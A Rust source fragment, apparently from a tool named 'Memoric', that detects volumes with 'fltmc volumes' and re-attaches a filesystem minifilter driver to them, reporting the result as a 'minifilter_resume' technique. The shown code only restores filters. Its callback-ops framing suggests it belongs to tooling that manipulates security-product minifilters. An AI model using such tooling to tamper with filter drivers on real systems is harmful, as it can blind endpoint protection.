        // Auto-detect volumes when none provided
        let vol_output = std::process::Command::new("fltmc")
            .args(["volumes"])
            .output()
            .map_err(|e| MemoricError::Other(format!("fltmc volumes failed: {}", e)))?;
        let vol_stdout = String::from_utf8_lossy(&vol_output.stdout);
        let detected: Vec<String> = vol_stdout
            .lines()
            .filter(|l| l.contains(":"))
            .filter_map(|l| {
                let parts: Vec<&str> = l.trim().split_whitespace().collect();
                parts.first().map(|v| v.to_string())
            })
            .collect();
        if detected.is_empty() {
            return Err(MemoricError::Other(
                "No volumes provided and auto-detection found none".to_string(),
            ));
        }
        return resume_attach_volumes(name, altitude, &detected);
    }

    resume_attach_volumes(name, altitude, &volumes)
}

fn resume_attach_volumes(
    name: &str,
    altitude: &str,
    volumes: &[String],
) -> Result<Value, MemoricError> {
    tracing::warn!(
        "[CALLBACK_OPS] Resuming minifilter: {} at altitude {}",
        name,
        altitude
    );

    let mut attached: Vec<String> = Vec::new();
    let mut failed: Vec<Value> = Vec::new();

    for vol in volumes {
        let output = std::process::Command::new("fltmc")
            .args(["attach", name, vol, altitude])
            .output()
            .map_err(|e| MemoricError::Other(format!("fltmc attach failed: {}", e)))?;

        let stderr = String::from_utf8_lossy(&output.stderr);
        if output.status.success() {
            attached.push(vol.clone());
        } else {
            failed.push(json!({
                "volume": vol,
                "error": stderr.trim().to_string()
            }));
        }
    }

    Ok(json!({
        "success": !attached.is_empty(),
        "technique": "minifilter_resume",
        "name": name,
        "altitude": altitude,
        "status": if !attached.is_empty() { "resumed" } else { "failed" },
        "attached_volumes": attached,
        "failed_volumes": failed,
        "message": format!("Minifilter '{}' re-attached to {} volume(s) at altitude {}", name, attached.len(), altitude)
    }))
}
